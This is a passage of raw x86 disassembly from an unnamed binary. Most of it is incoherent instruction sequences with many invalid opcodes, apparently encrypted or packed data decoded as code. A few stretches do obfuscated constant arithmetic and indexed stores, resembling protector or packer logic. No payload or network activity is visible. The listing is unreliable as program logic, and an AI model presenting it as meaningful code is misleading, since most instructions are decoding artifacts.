  410872:	xor    esi,0x1beea12e
  410878:	push   es
  410879:	dec    ecx
  41087a:	jp     0x410807
  41087c:	push   ss
  41087d:	nop
  41087e:	xor    al,0x61
  410880:	sub    BYTE PTR [eax],0xdf
  410883:	(bad)  
  410884:	jne    0x410831
  410886:	dec    esi
  410887:	std    
  410888:	mov    ah,0xf
  41088a:	bound  esi,QWORD PTR [edx]
  41088c:	loope  0x4108d7
  41088e:	and    al,0x1e
  410890:	outs   dx,BYTE PTR ds:[esi]
  410891:	dec    edx
  410892:	and    eax,0x49923c7f
  410897:	mov    esi,0x2ef5cc5d
  41089c:	retf   
  41089d:	in     eax,0x8e
  41089f:	aaa    
  4108a0:	adc    al,0x34
  4108a2:	mov    cl,0x31
  4108a4:	xlat   BYTE PTR ds:[ebx]
  4108a5:	mov    esp,0xb1ee088e
  4108aa:	idiv   ch
  4108ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108ad:	hlt    
  4108ae:	push   eax
  4108af:	inc    edx
  4108b0:	fwait
  4108b1:	popa   
  4108b2:	or     BYTE PTR [ebx+ebx*2+0x25],al
  4108b6:	je     0x4108e7
  4108b8:	dec    edx
  4108b9:	fxch   st(6)
  4108bb:	fld    DWORD PTR [edi+esi*1+0x5c]
  4108bf:	pop    ecx
  4108c0:	lods   al,BYTE PTR ds:[esi]
  4108c1:	mov    ds:0x20e66570,al
  4108c6:	mov    fs,WORD PTR [esi+0x4a]
  4108c9:	adc    BYTE PTR [ecx-0x6b],dl
  4108cc:	push   0xffffffc2
  4108ce:	and    eax,DWORD PTR [ecx]
  4108d0:	inc    ebx
  4108d1:	inc    esi
  4108d2:	into   
  4108d3:	xor    BYTE PTR [esi],al
  4108d5:	jne    0x410905
  4108d7:	setno  BYTE PTR [edx+0x4afa97bb]
  4108de:	stos   BYTE PTR es:[edi],al
  4108df:	xchg   DWORD PTR [ebx+ebp*1-0x26],edi
  4108e3:	(bad)  
  4108e6:	gs (bad) 
  4108e8:	into   
  4108e9:	jae    0x41094e
  4108eb:	pusha  
  4108ec:	out    0xfb,al
  4108ee:	pop    esp
  4108ef:	pop    ds
  4108f0:	adc    al,0xae
  4108f2:	lock popa 
  4108f4:	mov    ecx,0x277f8a1e
  4108f9:	mov    ds:0xae23c1b9,al
  4108fe:	out    dx,eax
  4108ff:	sti    
  410900:	jmp    0x41096d
  410902:	pop    esi
  410903:	inc    ebp
  410904:	leave  
  410905:	adc    ah,BYTE PTR [eax*2+0x346861f1]
  41090c:	push   DWORD PTR [ecx+eax*1+0x636cf23d]
  410913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410914:	xchg   BYTE PTR [ecx],dh
  410916:	mov    WORD PTR fs:[edi],ds
  410919:	rol    BYTE PTR [esi+0x6c],1
  41091c:	test   al,0xc8
  41091e:	push   ecx
  41091f:	movaps xmm6,xmm5
  410922:	dec    edx
  410923:	sub    BYTE PTR [esi+0x70239bed],0x2
  41092a:	stos   BYTE PTR es:[edi],al
  41092b:	and    al,0x67
  41092d:	and    DWORD PTR [edi+eax*1-0x7792a73c],edx
  410934:	sbb    eax,0x7defc888
  410939:	adc    eax,0xdd08cee7
  41093e:	mov    esp,DWORD PTR [ecx-0x55c8a414]
  410944:	and    edx,DWORD PTR [edx+0x64c752b6]
  41094a:	mov    dl,0x3f
  41094c:	sub    edx,DWORD PTR [ecx-0x54]
  41094f:	xchg   edx,eax
  410950:	adc    BYTE PTR [edi+0x244b8734],dl
  410956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410957:	out    0x54,al
  410959:	jge    0x4109c4
  41095b:	mov    eax,DWORD PTR [ebp-0x4bf71b1]
  410961:	mov    ebp,0xa043ab18
  410966:	mov    esi,0x985d64fd
  41096b:	push   ecx
  41096c:	mov    edi,0x1bbe5bdb
  410971:	add    DWORD PTR [edi],esi
  410973:	fimul  WORD PTR [ecx]
  410975:	js     0x4109e7
  410977:	(bad)  
  410978:	sar    bl,1
  41097a:	xchg   DWORD PTR [edi+0x51bd8f06],esp
  410980:	cwde   
  410981:	adc    BYTE PTR [esi+0x41787cf1],ch
  410987:	fiadd  WORD PTR [ebx+edi*2-0x74]
  41098b:	in     al,0xa6
  41098d:	cmp    BYTE PTR [esi-0x3efe8405],0xec
  410994:	aas    
  410995:	and    eax,0x855c35ea
  41099a:	xor    al,0xee
  41099c:	out    0x72,eax
  41099e:	je     0x41093f
  4109a0:	xchg   esp,eax
  4109a1:	addr16 mov esp,0x15b7fe4f
  4109a7:	mov    edx,ecx
  4109a9:	cdq    
  4109aa:	gs push esp
  4109ac:	outs   dx,BYTE PTR ds:[esi]
  4109ad:	xchg   DWORD PTR [esp+esi*1],eax
  4109b0:	leave  
  4109b1:	fisubr WORD PTR [esi-0xf]
  4109b4:	jge    0x4109d4
  4109b6:	loope  0x410a02
  4109b8:	leave  
  4109b9:	std    
  4109ba:	into   
  4109bb:	or     eax,0x58c4
  4109c0:	xor    edx,0x7a7a
  4109c6:	xor    eax,0x5278
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x42202e
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x42202e
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0xaa5360c8
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    BYTE PTR [eax],al
  410a7d:	inc    eax
  410a7e:	pop    es
  410a7f:	daa    
  410a80:	cmp    bl,BYTE PTR [ecx+0x2ae09fd3]
  410a86:	out    0xde,al
  410a88:	fld1   
  410a8a:	pop    edx
  410a8b:	in     eax,dx
  410a8c:	lea    eax,[ecx]
  410a8e:	pop    ebx
  410a8f:	xor    ecx,DWORD PTR [ebx]
  410a91:	mov    al,ds:0xe6a2095b
  410a96:	jnp    0x410af8
  410a98:	rcr    esp,0xc0
  410a9b:	sahf   
  410a9c:	mov    edx,0x76372b0b
  410aa1:	cmp    eax,0x6999295
  410aa6:	inc    esp
  410aa7:	dec    edi
  410aa8:	jge    0x410aa7
  410aaa:	add    eax,0x2b0cc118
  410aaf:	cmp    al,BYTE PTR [edi+edx*1]
  410ab2:	cdq    
  410ab3:	stos   BYTE PTR es:[edi],al
  410ab4:	cli    
  410ab5:	test   al,0xde
  410ab7:	int    0x57
  410ab9:	lds    esp,FWORD PTR [ebx]
  410abb:	mov    edx,0xdc13bed9
  410ac0:	(bad)  
  410ac1:	push   cs
  410ac2:	jbe    0x410a9b
  410ac4:	jmp    0x8a12:0x1e436372
  410acb:	jg     0x410a6c
  410acd:	bound  ecx,QWORD PTR [esi-0x6b045c28]
  410ad3:	test   BYTE PTR [ecx+eiz*4+0x63a800dc],al
  410ada:	xor    eax,0x45bc97a3
  410adf:	dec    edx
  410ae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ae1:	adc    al,BYTE PTR [ebp+0x1e204161]
  410ae7:	mov    edx,DWORD PTR [ecx-0x65]
  410aea:	add    al,0xe
  410aec:	jp     0x410b14
  410aee:	push   edx
  410aef:	jnp    0x410ac7
  410af1:	pop    ss
  410af2:	cmp    ah,dl
  410af4:	mov    ds:0x8d4e5402,eax
  410af9:	retf   0x538b
  410afc:	mov    bh,0x96
  410afe:	mov    ebx,0xbdde5994
  410b03:	mov    al,0xf2
  410b05:	jmp    0x5a738f5
  410b0a:	sub    ch,bl
  410b0c:	or     bl,dl
  410b0e:	arpl   WORD PTR [esi],sp
  410b10:	add    edx,esp
  410b12:	sahf   
  410b13:	call   0x77e67637
  410b18:	pop    es
  410b19:	pop    esp
  410b1a:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  410b1c:	ror    DWORD PTR [edi+ebp*4-0x6960df39],cl
  410b23:	mov    bh,0x82
  410b25:	in     al,0xb5
  410b27:	shl    eax,0x17
  410b2a:	out    dx,al
  410b2b:	pop    eax
  410b2c:	jns    0x410ac0
  410b2e:	jo     0x410b61
  410b30:	push   ebp
  410b32:	(bad)  
  410b33:	dec    ebp
  410b34:	jl     0x410aba
  410b36:	xor    bh,BYTE PTR [eax+ebp*4-0x45]
  410b3a:	ins    BYTE PTR es:[edi],dx
  410b3b:	cdq    
  410b3c:	pushf  
  410b3d:	test   dl,bh
  410b3f:	sbb    DWORD PTR ds:0x6db01cb6,0x411059bd
  410b49:	mov    DWORD PTR [ebx],edi
  410b4b:	mov    DWORD PTR [eax+edi*2-0x24],ebx
  410b4f:	jnp    0x410b86
  410b51:	and    al,0x66
  410b53:	sti    
  410b54:	push   ebp
  410b55:	popa   
  410b56:	not    BYTE PTR [edi-0x2e44c1cb]
  410b5c:	mov    ds:0x82e9fa3b,al
  410b61:	rcr    DWORD PTR [ecx-0x311950c1],0xe6
  410b68:	fisttp DWORD PTR [ebx-0x134e3f8a]
  410b6e:	arpl   WORD PTR [eax+0xf24a930],ax
  410b74:	fwait
  410b75:	mov    eax,0x2901434a
  410b7a:	mov    es,WORD PTR [ecx+0xee46a72]
  410b80:	jmp    FWORD PTR [edi]
  410b82:	jmp    DWORD PTR [esi+0x2100795]
  410b88:	jle    0x410b2a
  410b8a:	pop    eax
  410b8b:	sub    edx,DWORD PTR [edx+0x6e]
  410b8e:	pop    edx
  410b8f:	out    dx,eax
  410b90:	sti    
  410b91:	xchg   ebp,eax
  410b92:	adc    ch,BYTE PTR [esp+edx*4-0x25]
  410b96:	sbb    dl,BYTE PTR [edi]
  410b98:	dec    edx
  410b99:	xchg   BYTE PTR [edx-0x412fe6a1],cl
  410b9f:	cmp    BYTE PTR [esi],cl
  410ba1:	push   ebp
  410ba2:	jno    0x410b7c
  410ba4:	xchg   edi,eax
  410ba5:	push   esp
  410ba6:	imul   ecx,DWORD PTR [esi-0x7cd347f2],0x54441fb0
  410bb0:	sub    BYTE PTR [esi-0x1eb07b96],dl
  410bb6:	cmp    ah,BYTE PTR [edx+0x1d]
  410bb9:	out    dx,al
  410bba:	lock mov eax,gs
  410bbd:	pop    eax
  410bbe:	xor    al,0xdd
  410bc0:	mov    WORD PTR [esi],?
  410bc2:	or     cl,ah
  410bc4:	mul    DWORD PTR [ecx-0x522920e7]
  410bca:	(bad)  
  410bcb:	ss dec esi
  410bcd:	push   es
  410bce:	add    ebp,DWORD PTR [esi]
  410bd0:	repnz test al,0x17
  410bd3:	mov    esp,0x35842d96
  410bd8:	pusha  
  410bd9:	push   edx
  410bda:	sub    al,0x20
  410bdc:	xchg   ecx,eax
  410bdd:	rol    esp,cl
  410bdf:	xor    eax,0x296ed501
  410be4:	push   edx
  410be5:	mov    BYTE PTR [esp+ebp*1],ch
  410be8:	cmc    
  410be9:	es test ch,cl
  410bec:	ret    0x1aa4
  410bef:	xchg   edx,eax
  410bf0:	test   BYTE PTR [edx],al
  410bf2:	call   0x17575520
  410bf7:	out    dx,eax
  410bf8:	data16 ror BYTE PTR [ecx-0x309fed2b],cl
  410bff:	pop    esp
  410c00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c01:	mov    dl,0xce
  410c03:	cmp    al,BYTE PTR [ebx]
  410c05:	ret    
  410c06:	or     esp,DWORD PTR [ebp+edi*4-0x680a6ecf]
  410c0d:	(bad)  
  410c0e:	cmp    ebx,DWORD PTR [ebp-0x1b]
  410c11:	ins    DWORD PTR es:[edi],dx
  410c12:	push   edi
  410c13:	clc    
  410c14:	nop
  410c15:	add    al,BYTE PTR [edi+0x7d]
  410c18:	call   0x25abf627
  410c1d:	das    
  410c1e:	dec    ebx
  410c1f:	xor    DWORD PTR [ecx],ecx
  410c21:	sbb    ah,ch
  410c23:	or     al,0x48
  410c25:	push   0xffffffad
  410c27:	fistp  QWORD PTR [ecx+0x172440de]
  410c2d:	push   edx
  410c2e:	xchg   edi,eax
  410c2f:	mov    WORD PTR [edi],es
  410c31:	pop    edi
  410c32:	clc    
  410c33:	out    dx,al
  410c34:	mov    dl,0x2c
  410c36:	(bad)  
  410c37:	pushf  
  410c38:	fcmovne st,st(4)
  410c3a:	sub    DWORD PTR [ebp-0x9eaded7],ecx
  410c40:	leave  
  410c41:	lahf   
  410c42:	in     eax,0xd1
  410c44:	jl     0x410bf5
  410c46:	test   DWORD PTR [eax+0x5195b431],edx
  410c4c:	adc    al,BYTE PTR [edi+0x4a]
  410c4f:	fiadd  DWORD PTR [eax]
  410c51:	mov    ah,0x4b
  410c53:	xor    al,0xf1
  410c55:	dec    ebx
  410c56:	sahf   
  410c57:	dec    esp
  410c58:	xchg   esp,eax
  410c59:	sub    eax,DWORD PTR [edx-0x7c]
  410c5c:	mov    ebp,0x6fc71053
  410c61:	mov    al,ds:0xda476174
  410c66:	inc    edi
  410c67:	push   esp
  410c68:	and    eax,0x2202a8d8
  410c6d:	test   DWORD PTR [ebp-0x30ed93fe],esi
  410c73:	push   ecx
  410c74:	in     eax,0x4b
  410c76:	xor    eax,0xdd2e381b
  410c7b:	add    DWORD PTR [esi-0x6a5a347f],edi
  410c81:	mov    ebx,0xd1793a99
  410c86:	cld    
  410c87:	mov    BYTE PTR [ebp-0x78],dl
  410c8a:	loop   0x410c52
  410c8c:	jecxz  0x410c61
  410c8e:	mov    ebx,0x2257608a
  410c93:	push   edi
  410c94:	mov    ecx,0x28c7400
  410c99:	sub    BYTE PTR [edi],dh
  410c9b:	js     0x410ce4
  410c9d:	sti    
  410c9e:	sbb    ecx,DWORD PTR [ecx]
  410ca0:	mov    ebp,0x57120b42
  410ca5:	jns    0x410cb2
  410ca7:	stc    
  410ca8:	sbb    bh,BYTE PTR [esi+0x5896c9bf]
  410cae:	dec    esi
  410caf:	cdq    
  410cb0:	xor    al,0x48
  410cb2:	xor    cl,BYTE PTR [eax-0x13]
  410cb5:	add    eax,0x6d1b2a65
  410cba:	sbb    al,0xb6
  410cbc:	ficom  DWORD PTR [esi+edi*4+0x6c83d355]
  410cc3:	mov    WORD PTR [esi-0x48],es
  410cc6:	or     bl,bl
  410cc8:	mov    esi,0xc8c49b00
  410ccd:	pop    ds
  410cce:	ins    BYTE PTR es:[edi],dx
  410ccf:	popf   
  410cd0:	and    eax,0xe6e9b010
  410cd5:	mov    ds:0x7d9e49f6,eax
  410cda:	ja     0x410d0e
  410cdc:	jae    0x410d0d
  410cde:	mov    eax,0xbd3cde0e
  410ce3:	(bad)  
  410ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ce5:	pusha  
  410ce6:	mov    cl,0x68
  410ce8:	or     al,0x3e
  410cea:	mov    edi,edi
  410cec:	sbb    al,ch
  410cee:	popa   
  410cef:	cld    
  410cf0:	retf   
  410cf1:	mov    BYTE PTR [edx],dl
  410cf3:	xor    al,0x4f
  410cf5:	int    0x6
  410cf7:	sub    al,0xe0
  410cf9:	mov    dl,0x7b
  410cfb:	push   0x8dbc6cb0
  410d00:	pushf  
  410d01:	pop    edi
  410d02:	ret    0x2d13
  410d05:	clc    
  410d06:	mov    ebx,?
  410d08:	je     0x410cad
  410d0a:	int3   
  410d0b:	push   esp
  410d0c:	and    BYTE PTR [edx+0x74],al
  410d0f:	pop    edx
  410d10:	push   ds
  410d11:	mov    edx,0xce506288
  410d16:	cmp    eax,0x2c810c49
  410d1b:	test   al,0x81
  410d1d:	and    al,0xe0
  410d1f:	sahf   
  410d20:	es dec ecx
  410d22:	inc    ebx
  410d23:	int3   
  410d24:	xchg   esp,eax
  410d25:	mov    edi,0xee94b2c6
  410d2b:	or     eax,0x513dd459
  410d30:	add    eax,ebp
  410d32:	(bad)  [ecx]
  410d34:	mov    BYTE PTR [eax-0x70],0x13
  410d38:	sbb    DWORD PTR [esi-0x1c],ecx
  410d3b:	scas   eax,DWORD PTR es:[edi]
  410d3c:	not    ebp
  410d3e:	imul   ecx,DWORD PTR [ecx+0x45c7fc7d],0xfffffff4
  410d45:	mov    ch,BYTE PTR [eax+eax*1]
  410d48:	add    BYTE PTR [ebx+0x1b8f44d],cl
  410d4e:	inc    esp
  410d4f:	add    BYTE PTR [eax],al
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0xffffff92
  410d65:	scas   al,BYTE PTR es:[edi]
  410d66:	xchg   ebp,eax
  410d67:	mov    esp,0x1818826d
  410d6c:	call   0x87:0xd8181814
  410d73:	ffreep st(5)
  410d75:	jnp    0x410cff
  410d77:	mov    ah,0xc7
  410d79:	or     ebp,0x59433007
  410d7f:	aad    0x1d
  410d81:	or     dh,BYTE PTR [eax+0x1004b587]
  410d87:	pop    edi
  410d88:	mov    bl,0x4d
  410d8a:	push   cs
  410d8b:	pop    edi
  410d8c:	mov    bh,0x9f
  410d8e:	mov    cl,0x22
  410d90:	cmp    bl,BYTE PTR [ecx]
  410d92:	(bad)  
  410d93:	push   ebx
  410d94:	or     al,0x6a
  410d96:	shr    ecx,cl
  410d98:	sbb    BYTE PTR [eax],al
  410d9a:	xchg   esp,eax
  410d9b:	fisttp WORD PTR [esi]
  410d9d:	inc    edx
  410d9e:	jns    0x410d3f
  410da0:	xchg   edx,eax
  410da1:	out    dx,eax
  410da2:	xchg   edi,eax
  410da3:	dec    ebx
  410da4:	test   eax,0x4e92523e
  410da9:	mov    ch,0xae
  410dab:	fnstsw WORD PTR [eax]
  410dad:	into   
  410dae:	pop    ebp
  410daf:	mov    cl,0xeb
  410db1:	out    dx,eax
  410db2:	pusha  
  410db3:	add    dh,bh
  410db5:	mov    bl,0x27
  410db7:	fmulp  st(6),st
  410db9:	adc    DWORD PTR [edi],eax
  410dbb:	lahf   
  410dbc:	adc    BYTE PTR [esi],al
  410dbe:	and    DWORD PTR [esi+0x31],0x23961e73
  410dc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dc6:	push   0x66
  410dc8:	in     al,0xed
  410dca:	lea    esp,[edx+0x3f47b8c1]
  410dd0:	push   edx
  410dd1:	fisttp WORD PTR [ebp+0x3b]
  410dd4:	push   0x7c
  410dd6:	or     edx,eax
  410dd8:	mov    eax,0x3b0b9a05
  410ddd:	sub    ch,BYTE PTR [edi+ebx*8]
  410de0:	loope  0x410e0d
  410de2:	mov    edx,0xe7fe6a8a
  410de7:	mov    gs,WORD PTR [ebx-0x4b5c6f7d]
  410ded:	mov    ecx,0x182147e5
  410df2:	pop    ds
  410df3:	xchg   ebp,eax
  410df4:	loop   0x410e1b
  410df6:	add    DWORD PTR [eax+eax*4],ebx
  410df9:	adc    eax,esp
  410dfb:	add    eax,0x37a19b2a
  410e00:	pop    ebp
  410e01:	mov    esp,0xd8560de8
  410e06:	mov    dh,0xcd
  410e08:	mul    DWORD PTR [ecx+edi*4+0x6b92f1c5]
  410e0f:	mov    esp,0xdb8b88b0
  410e14:	pop    ds
  410e15:	and    eax,0xef49aa55
  410e1a:	adc    bh,BYTE PTR [edx-0x6a]
  410e1d:	std    
  410e1e:	retf   0x8d04
  410e21:	pop    edx
  410e22:	sahf   
  410e23:	int3   
  410e24:	add    DWORD PTR ds:0x78bfd339,0x6d
  410e2b:	pop    ds
  410e2c:	stos   DWORD PTR es:[edi],eax
  410e2d:	scas   al,BYTE PTR es:[edi]
  410e2e:	mov    bh,0x50
  410e30:	push   esp
  410e31:	jl     0x410e70
  410e33:	rol    BYTE PTR [eax-0x406b2188],1
  410e39:	fimul  DWORD PTR [ebx]
  410e3b:	xchg   esi,eax
  410e3c:	dec    ecx
  410e3d:	pusha  
  410e3e:	ret    
  410e3f:	cs jmp 0x410e35
  410e42:	addr16 mov dl,0x46
  410e45:	hlt    
  410e46:	jnp    0x410e54
  410e48:	mov    eax,ds:0xd506963e
  410e4d:	ret    
  410e4e:	xchg   DWORD PTR [ecx],eax
  410e50:	mov    al,0x0
  410e52:	mov    ebx,0x1286e573
  410e57:	sbb    ebx,edx
  410e59:	iret   
  410e5a:	int3   
  410e5b:	push   ebx
  410e5c:	xchg   edx,eax
  410e5d:	clc    
  410e5e:	aaa    
  410e5f:	mov    ebp,0xcbeec223
  410e64:	pop    esi
  410e65:	jno    0x410df1
  410e67:	xchg   ebp,eax
  410e68:	dec    esi
  410e69:	cs sbb cl,0xb7
  410e6d:	imul   ecx,DWORD PTR [eax+0x1ff4dc7],0x54
  410e74:	fdiv   st(0),st
  410e76:	mov    bh,0xc8
  410e78:	repnz pop edx
  410e7a:	inc    esp
  410e7b:	or     BYTE PTR [ebx],ch
  410e7d:	dec    esp
  410e7e:	aad    0x17
  410e80:	iret   
  410e81:	out    0xc9,eax
  410e83:	lahf   
  410e84:	test   bl,0xe3
  410e87:	mov    al,ds:0xdcb15847
  410e8c:	push   eax
  410e8d:	rcr    BYTE PTR [edi-0x62f5671b],cl
  410e93:	(bad)  
  410e94:	jne    0x410ee4
  410e96:	pop    edi
  410e98:	adc    BYTE PTR [ecx+0x64],bh
  410e9b:	hlt    
  410e9c:	cmp    BYTE PTR [edx+0x1baed552],ch
  410ea2:	and    eax,0xc2e9dd43
  410ea7:	jne    0x410e6b
  410ea9:	mov    edi,0xb59f8b11
  410eae:	add    BYTE PTR [ecx],cl
  410eb0:	adc    ah,dh
  410eb2:	stos   BYTE PTR es:[edi],al
  410eb3:	cs jecxz 0x410e9e
  410eb6:	in     al,dx
  410eb7:	and    BYTE PTR [ebx],ch
  410eb9:	in     eax,dx
  410eba:	sbb    al,BYTE PTR [esi]
  410ebc:	aam    0x6e
  410ebe:	add    DWORD PTR [edi],ecx
  410ec0:	(bad)  
  410ec1:	in     eax,0x4b
  410ec3:	add    DWORD PTR [esp+edx*8],eax
  410ec6:	xchg   BYTE PTR [eax+0x207dfa2d],ah
  410ecc:	fdivr  st,st(5)
  410ece:	and    ebp,ecx
  410ed0:	(bad)  
  410ed1:	pop    ds
  410ed2:	or     al,0x9e
  410ed4:	mov    bh,0x1e
  410ed6:	les    esi,FWORD PTR [ebx]
  410ed8:	xchg   esi,eax
  410ed9:	not    BYTE PTR [ecx]
  410edb:	mov    ?,WORD PTR [esi+0x75]
  410ede:	repz (bad) 
  410ee0:	xchg   ebx,eax
  410ee1:	pushf  
  410ee2:	adc    esp,DWORD PTR [edx+0x6762f359]
  410ee8:	daa    
  410ee9:	sbb    eax,0x6bbce083
  410eee:	xchg   edi,edx
  410ef0:	sub    ch,BYTE PTR [edi-0x21]
  410ef3:	pop    esp
  410ef4:	fsubp  st(4),st
  410ef6:	pop    edi
  410ef7:	retf   0xf475
  410efa:	in     al,0xc4
  410efc:	cld    
  410efd:	ficom  WORD PTR [edx+0x511ba85b]
  410f03:	cmp    bl,BYTE PTR [ebp+0xad13d48]
  410f09:	xor    al,BYTE PTR [edx+0x2a]
  410f0c:	and    edx,esp
  410f0e:	dec    ebx
  410f0f:	cli    
  410f10:	inc    edi
  410f11:	fild   QWORD PTR [eax+0x756e53b0]
  410f17:	leave  
  410f18:	pop    edx
  410f19:	mov    eax,ds:0xc61c3493
  410f1e:	push   edi
  410f1f:	xchg   ecx,eax
  410f20:	ins    BYTE PTR es:[edi],dx
  410f21:	mov    ebx,DWORD PTR [ecx]
  410f23:	push   esi
  410f24:	sar    dh,cl
  410f26:	dec    esp
  410f27:	cld    
  410f28:	pop    eax
  410f29:	mov    cl,0x3f
  410f2b:	mov    ?,WORD PTR [ebx]
  410f2d:	sub    ebp,DWORD PTR [eax+ebx*4+0x20]
  410f31:	pop    ds
  410f32:	aas    
  410f33:	pop    ss
  410f34:	stos   BYTE PTR es:[edi],al
  410f35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f36:	pusha  
  410f37:	leave  
  410f38:	icebp  
  410f39:	pop    ds
  410f3a:	mov    bl,0x51
  410f3c:	fwait
  410f3d:	mov    esp,0xa6fc97e1
  410f42:	in     al,dx
  410f43:	test   WORD PTR [ebx],cx
  410f46:	test   DWORD PTR [edx-0x4d2329db],ebp
  410f4c:	mov    eax,ds:0x16240aa5
  410f51:	add    edi,DWORD PTR [esi]
  410f53:	sbb    eax,0xa7cf7ed4
  410f58:	out    dx,al
  410f59:	or     dh,0x42
  410f5c:	popf   
  410f5d:	xchg   BYTE PTR ss:[ebx-0xe],bl
  410f61:	pushf  
  410f62:	mov    cl,0x9f
  410f64:	rep ins DWORD PTR es:[edi],dx
  410f66:	jg     0x410fbd
  410f68:	lea    ebp,[ecx-0x57329198]
  410f6e:	bnd jne 0x410f87
  410f71:	mov    DWORD PTR [ebx],0x419fa530
  410f77:	push   eax
  410f78:	sbb    al,0x5f
  410f7a:	shl    BYTE PTR [eax-0x62],1
  410f7d:	mov    ebp,0x8f024c1
  410f82:	imul   ecx,DWORD PTR [esi+0x51],0x39157942
  410f89:	aam    0x6
  410f8b:	je     0x410f1a
  410f8d:	inc    esi
  410f8e:	icebp  
  410f8f:	xchg   esi,eax
  410f90:	or     ch,BYTE PTR [ecx-0x50]
  410f93:	add    ah,BYTE PTR [eax+0x6f]
  410f96:	mov    cl,0x1b
  410f98:	mov    esp,DWORD PTR ds:[edi]
  410f9b:	adc    DWORD PTR [ecx],esp
  410f9d:	(bad)  
  410f9e:	jmp    0x721a:0xde92bb5a
  410fa5:	lahf   
  410fa6:	addr16 jno 0x411000
  410fa9:	ins    DWORD PTR es:[edi],dx
  410faa:	cmp    ch,bh
  410fac:	push   ebx
  410fad:	sbb    cl,BYTE PTR [ecx]
  410faf:	cmp    ch,BYTE PTR [esi-0x5e]
  410fb2:	push   es
  410fb3:	ins    DWORD PTR es:[edi],dx
  410fb4:	pusha  
  410fb5:	mov    al,0x1
  410fb7:	jmp    0x21140400
  410fbc:	mov    eax,0x5aeaefb8
  410fc1:	imul   eax,edx,0xf400f535
  410fc7:	pop    ecx
  410fc8:	inc    edi
  410fc9:	mov    ebx,0xccf34ee0
  410fce:	cmp    eax,0xe305e6f7
  410fd3:	push   edi
  410fd4:	pushf  
  410fd5:	inc    esi
  410fd6:	adc    edi,0xffffffdd
  410fd9:	inc    eax
  410fda:	sub    DWORD PTR [eax-0x4ce7afa4],esp
  410fe0:	rcl    BYTE PTR ds:0x375dcd39,cl
  410fe6:	arpl   WORD PTR [eax],si
  410fe8:	mov    esi,0x4bf423cb
  410fed:	fcom   QWORD PTR [edi]
  410fef:	xchg   ecx,eax
  410ff0:	push   ecx
  410ff1:	enter  0x5c22,0x18
  410ff5:	xchg   edx,eax
  410ff6:	hlt    
  410ff7:	retf   0xe55e
  410ffa:	inc    edi
  410ffb:	mov    esp,0xa9027f5d
  411000:	imul   edi,DWORD PTR [edx],0xffffff9e
  411003:	and    eax,0xe877a24a
  411008:	int    0x89
  41100a:	push   eax
  41100b:	shl    BYTE PTR [ebx],cl
  41100d:	dec    ebp
  41100e:	sahf   
  41100f:	not    DWORD PTR [ecx+0x5e8950ed]
  411015:	ins    DWORD PTR es:[edi],dx
  411016:	push   ss
  411017:	in     al,0xe5
  411019:	addr16 pop eax
  41101b:	inc    edi
  41101c:	repz sbb eax,0x27ebb007
  411022:	(bad)  
  411023:	xlat   BYTE PTR ds:[ebx]
  411024:	mov    dh,0xfa
  411026:	sub    esp,esp
  411028:	(bad)  
  411029:	into   
  41102a:	cwde   
  41102b:	cmp    al,0xd3
  41102d:	mov    eax,0x230d7e29
  411032:	imul   ecx,DWORD PTR [ebx-0x2dcc03b3],0xfffffff7
  411039:	icebp  
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
